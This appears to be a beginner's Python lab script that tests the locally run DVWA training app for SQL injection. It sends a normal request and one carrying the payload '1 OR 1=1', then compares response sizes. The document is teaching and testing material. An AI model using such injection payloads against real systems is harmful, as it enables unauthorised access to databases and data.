import requests

# This is the URL of the DVWA SQL Injection test page
# It is running locally on your machine through Docker
url = "http://localhost:8080/vulnerabilities/sqli/"

# DVWA requires us to be logged in
# These cookies tell DVWA:
#   1. Who we are (PHPSESSID)
#   2. That the security level is low

# Replace PASTE_YOURS_HERE with your actual PHPSESSID value
cookies = {
    "PHPSESSID": "v0u0oiu072bi0uokse4b3mtve1",
    "security": "low"
}


# Normal request #

# This simulates normal user behaviour:
# Asking for the user with ID = 1
response_normal = requests.get(
    url,
    params={
        "id": "1",              # Normal input (what the page expects)
        "Submit": "Submit"      # Simulates clicking the submit button
    },
    cookies=cookies             # Send our login session
)

# We measure how much data the website sent back
# Normal responses usually return less data
normal_length = len(response_normal.text)

print("Normal request length:", normal_length)


# SQL injection request #

# This simulates unusual input that should not change logic
# If the site is vulnerable, this input will return more data
response_injected = requests.get(
    url,
    params={
        "id": "1 OR 1=1",       # SQL injection payload
        "Submit": "Submit"
    },
    cookies=cookies
)

# Measure how much data came back from the injection attempt
injected_length = len(response_injected.text)

print("Injection request length:", injected_length)


# Compare results #

# If the injection response is significantly larger, it means the database returned more data than intended
# This strongly suggests SQL injection
if injected_length > normal_length:
    print("Possible SQL injection detected!")
else:
    print("No obvious difference")